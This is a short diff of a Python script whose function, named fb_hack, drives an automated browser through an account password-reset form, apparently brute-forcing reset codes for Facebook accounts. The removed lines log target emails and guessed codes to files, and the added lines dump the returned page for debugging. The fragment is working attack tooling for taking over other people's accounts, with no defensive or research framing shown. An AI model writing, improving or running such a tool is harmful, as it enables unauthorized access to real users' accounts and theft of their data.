@@ -68,17 +68,14 @@ def fb_hack(email, codex):
   try:
     browser.select_form(nr=0)
   except:
-    with open("emails.txt", "a+") as f:
-        f.write(str(email))
-        f.close()
-    with open("passcoder.txt", "a+") as z:
-        z.write(str(codex))
-        z.close()
-    with open("passcoder.txt", "r") as z:
-      reset = z.readlines(-1)
-      z.close()
-    y = int(codex)
-    raise
+    print(browser.geturl())
+    response1 = browser.response()
+    soup = BeautifulSoup(response1, 'html.parser')
+    with open("soupa.txt", "a+") as f:
+      f.write(soup)
+      f.close()
+    print(soup)
+    sys.exit()
   browser.form['email'] = email
   browser.submit()
   """selection confirmation"""
